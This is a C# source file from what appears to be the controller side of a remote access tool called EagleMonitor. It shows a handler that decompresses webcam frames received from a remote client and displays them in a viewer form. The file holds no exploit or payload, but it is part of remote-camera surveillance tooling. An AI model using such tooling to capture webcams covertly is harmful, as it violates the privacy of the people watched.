using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class RemoteCameraCapturePacketHandler
    {
        public RemoteCameraCapturePacketHandler(RemoteCameraCapturePacket remoteCameraCapturePacket, ClientHandler clientHandler)
        {
            try
            {
                ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCameraForm.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCameraForm.hasAlreadyConnected = true;
                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCameraForm.cameraViewerPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
                }));
                return;
            }
            catch { }
        }
    }
}
